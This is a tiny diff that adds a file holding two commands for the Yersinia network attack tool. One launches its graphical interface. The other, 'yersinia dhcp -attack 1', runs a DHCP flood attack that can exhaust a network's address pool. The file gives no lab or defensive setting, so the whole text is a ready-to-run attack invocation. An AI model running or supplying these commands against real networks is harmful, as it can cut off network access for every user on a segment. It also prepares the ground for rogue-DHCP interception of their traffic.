@@ -1,0 +1,3 @@
+sudo yersinia -G
+
+sudo yersinia dhcp -attack 1
